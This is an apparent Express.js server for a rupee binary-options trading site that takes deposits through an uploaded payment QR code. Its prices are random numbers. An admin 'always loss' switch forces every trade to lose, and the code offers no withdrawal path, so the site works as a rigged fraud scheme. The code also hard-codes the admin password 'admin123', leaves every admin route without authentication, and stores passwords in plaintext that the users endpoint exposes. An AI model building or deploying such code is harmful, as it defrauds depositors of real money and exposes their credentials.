const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '../public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../views'));

// In-memory storage with persistence
let users = {};
let trades = [];
let depositRequests = [];
let qrCode = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=='; // Default QR placeholder
let maintenanceMode = 'off';
let alwaysLoss = 'off';

// Global QR storage to prevent loss
if (!global.persistentQR) {
  global.persistentQR = qrCode;
} else {
  qrCode = global.persistentQR;
}

// Price generation
let currentPrice = 85000;
const generatePrice = () => Math.random() * (85000 - 82000) + 82000;

// Multer for file uploads
const storage = multer.memoryStorage();
const upload = multer({ storage });

// Socket.io for real-time data
const sendPriceUpdate = () => {
  const change = (Math.random() - 0.5) * 1000;
  currentPrice += change;
  io.emit('priceUpdate', { price: currentPrice });
};

setInterval(sendPriceUpdate, 1000);

io.on('connection', (socket) => {
  socket.emit('priceUpdate', { price: currentPrice });
});

// Routes
app.get('/', (req, res) => {
  res.render('index');
});

app.get('/login', (req, res) => {
  res.render('login');
});

app.get('/register', (req, res) => {
  res.render('register');
});

app.get('/deposit', (req, res) => {
  res.render('deposit');
});

app.get('/admin', (req, res) => {
  res.render('admin');
});

app.get('/admin-login', (req, res) => {
  res.render('admin-login');
});

// API Routes
app.post('/api/register', (req, res) => {
  const { username, password } = req.body;
  
  if (users[username]) {
    return res.status(400).json({ success: false, message: 'Username already exists' });
  }
  
  users[username] = {
    id: username,
    username,
    password,
    demoBalance: 50000,
    realBalance: 0,
    currentAccount: 'demo'
  };
  
  res.json({ success: true, userId: username, message: 'Registration successful' });
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const user = users[username];
  
  if (user && user.password === password) {
    res.json({ success: true, userId: username, message: 'Login successful' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

app.get('/api/balance/:userId', (req, res) => {
  const { userId } = req.params;
  
  if (!users[userId]) {
    users[userId] = {
      id: userId,
      username: userId,
      demoBalance: 50000,
      realBalance: 0,
      currentAccount: 'demo'
    };
  }
  
  const user = users[userId];
  res.json({
    success: true,
    demoBalance: user.demoBalance,
    realBalance: user.realBalance,
    currentAccount: user.currentAccount
  });
});

app.post('/api/trade', (req, res) => {
  const { userId, amount, direction, accountType = 'demo' } = req.body;
  
  if (!users[userId]) {
    users[userId] = {
      id: userId,
      username: userId,
      demoBalance: 50000,
      realBalance: 0,
      currentAccount: 'demo'
    };
  }
  
  const user = users[userId];
  const tradeAmount = parseFloat(amount);
  const currentBalance = accountType === 'demo' ? user.demoBalance : user.realBalance;
  
  if (tradeAmount > currentBalance) {
    return res.status(400).json({ success: false, message: 'Insufficient balance' });
  }

  if (accountType === 'demo') {
    user.demoBalance -= tradeAmount;
  } else {
    user.realBalance -= tradeAmount;
  }

  const trade = {
    id: uuidv4(),
    userId,
    amount: tradeAmount,
    direction,
    accountType,
    entryPrice: currentPrice,
    timestamp: new Date().toISOString(),
    status: 'active'
  };

  trades.push(trade);

  setTimeout(() => {
    const finalPrice = currentPrice;
    const priceChange = finalPrice - trade.entryPrice;
    const isWin = (direction === 'up' && priceChange > 0) || (direction === 'down' && priceChange < 0);
    const actualWin = alwaysLoss === 'on' ? false : isWin;
    
    trade.status = actualWin ? 'won' : 'lost';
    trade.exitPrice = finalPrice;
    trade.payout = actualWin ? tradeAmount * 1.8 : 0;
    
    if (actualWin) {
      if (accountType === 'demo') {
        user.demoBalance += trade.payout;
      } else {
        user.realBalance += trade.payout;
      }
    }
    
    io.emit('tradeResult', trade);
  }, 30000);

  res.json({ success: true, trade, message: 'Trade placed successfully' });
});

app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === 'admin' && password === 'admin123') {
    res.json({ success: true, message: 'Login successful' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

app.post('/api/admin/deposit', (req, res) => {
  const { userId, amount, accountType = 'real' } = req.body;
  
  if (!users[userId]) {
    users[userId] = {
      id: userId,
      username: userId,
      demoBalance: 50000,
      realBalance: 0,
      currentAccount: 'demo'
    };
  }
  
  const user = users[userId];
  const depositAmount = parseFloat(amount);
  
  if (accountType === 'demo') {
    user.demoBalance += depositAmount;
  } else {
    user.realBalance += depositAmount;
  }
  
  res.json({ success: true, message: `Deposited ₹${depositAmount} to ${accountType} account` });
});

app.post('/api/balance/:userId/update', (req, res) => {
  const { userId } = req.params;
  const { currentAccount } = req.body;
  
  if (!users[userId]) {
    users[userId] = {
      id: userId,
      username: userId,
      demoBalance: 50000,
      realBalance: 0,
      currentAccount: 'demo'
    };
  }
  
  if (currentAccount) {
    users[userId].currentAccount = currentAccount;
  }
  
  res.json({ success: true });
});

app.get('/api/trades/:userId', (req, res) => {
  const { userId } = req.params;
  const userTrades = trades.filter(t => t.userId === userId);
  res.json({ success: true, trades: userTrades });
});

app.get('/api/qr-code', (req, res) => {
  const currentQR = global.persistentQR || qrCode;
  res.json({ success: true, qrCode: currentQR });
});

app.get('/api/admin/qr-code', (req, res) => {
  const currentQR = global.persistentQR || qrCode;
  res.json({ success: true, qrCode: currentQR });
});

app.post('/api/admin/upload-qr', upload.single('qrCode'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ success: false, message: 'No file uploaded' });
  }

  const base64Image = `data:${req.file.mimetype};base64,${req.file.buffer.toString('base64')}`;
  qrCode = base64Image;
  global.persistentQR = base64Image; // Store globally
  
  res.json({ success: true, message: 'QR code uploaded successfully', qrCode });
});

app.post('/api/deposit-request', (req, res) => {
  const { userId, amount, utr } = req.body;
  
  if (!userId || !amount || !utr) {
    return res.status(400).json({ success: false, message: 'Missing required fields' });
  }

  const depositAmount = parseFloat(amount);
  if (isNaN(depositAmount) || depositAmount <= 0) {
    return res.status(400).json({ success: false, message: 'Invalid amount' });
  }

  const depositRequest = {
    id: uuidv4(),
    userId: String(userId),
    amount: depositAmount,
    utr: utr.trim(),
    status: 'pending',
    timestamp: new Date().toISOString()
  };

  depositRequests.push(depositRequest);
  
  res.json({ 
    success: true, 
    message: `Deposit request for ₹${depositAmount} submitted successfully. UTR: ${utr}` 
  });
});

app.get('/api/admin/deposit-requests', (req, res) => {
  const sortedRequests = [...depositRequests].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  res.json({ success: true, requests: sortedRequests });
});

app.post('/api/admin/deposit-requests/:id/approve', (req, res) => {
  try {
    const { id } = req.params;
    const requestIndex = depositRequests.findIndex(r => r.id === id);
    
    if (requestIndex === -1) {
      return res.status(404).json({ success: false, message: 'Deposit request not found' });
    }
    
    const request = depositRequests[requestIndex];
    if (request.status !== 'pending') {
      return res.status(400).json({ success: false, message: 'Request already processed' });
    }
    
    // Create user if doesn't exist
    if (!users[request.userId]) {
      users[request.userId] = {
        id: request.userId,
        username: request.userId,
        demoBalance: 50000,
        realBalance: 0,
        currentAccount: 'demo'
      };
    }
    
    // Add money to real balance
    users[request.userId].realBalance += request.amount;
    
    // Update request status
    request.status = 'approved';
    request.approvedAt = new Date().toISOString();
    
    // Emit balance update via Socket.IO
    io.emit('balanceUpdate', {
      userId: request.userId,
      demoBalance: users[request.userId].demoBalance,
      realBalance: users[request.userId].realBalance
    });
    
    res.json({ 
      success: true, 
      message: `Deposit approved! ₹${request.amount} added to ${request.userId}'s real account` 
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/admin/deposit-requests/:id/reject', (req, res) => {
  const { id } = req.params;
  const request = depositRequests.find(r => r.id === id);
  
  if (!request) {
    return res.status(404).json({ success: false, message: 'Deposit request not found' });
  }
  
  request.status = 'rejected';
  request.rejectedAt = new Date().toISOString();
  
  res.json({ success: true, message: 'Deposit request rejected' });
});

app.get('/api/admin/maintenance', (req, res) => {
  res.json({ success: true, maintenanceMode });
});

app.post('/api/admin/maintenance', (req, res) => {
  const { maintenanceMode: mode } = req.body;
  if (!['on', 'off'].includes(mode)) {
    return res.status(400).json({ success: false, message: 'Invalid maintenance mode value' });
  }
  
  maintenanceMode = mode;
  res.json({ success: true, message: `Maintenance mode set to ${mode}` });
});

app.get('/api/admin/always-loss', (req, res) => {
  res.json({ success: true, alwaysLoss });
});

app.post('/api/admin/always-loss', (req, res) => {
  const { alwaysLoss: mode } = req.body;
  if (!['on', 'off'].includes(mode)) {
    return res.status(400).json({ success: false, message: 'Invalid always loss mode value' });
  }
  
  alwaysLoss = mode;
  res.json({ success: true, message: `Always loss mode set to ${mode}` });
});

app.get('/api/admin/stats', (req, res) => {
  res.json({
    success: true,
    stats: {
      totalUsers: Object.keys(users).length,
      onlineUsers: 0,
      activeTrades: trades.filter(t => t.status === 'active').length,
      totalVolume: trades.reduce((sum, t) => sum + t.amount, 0),
      serverRevenue: 0,
      winRate: 50
    }
  });
});

app.get('/api/admin/users', (req, res) => {
  res.json({ success: true, users: Object.values(users), onlineUsers: {} });
});

module.exports = app;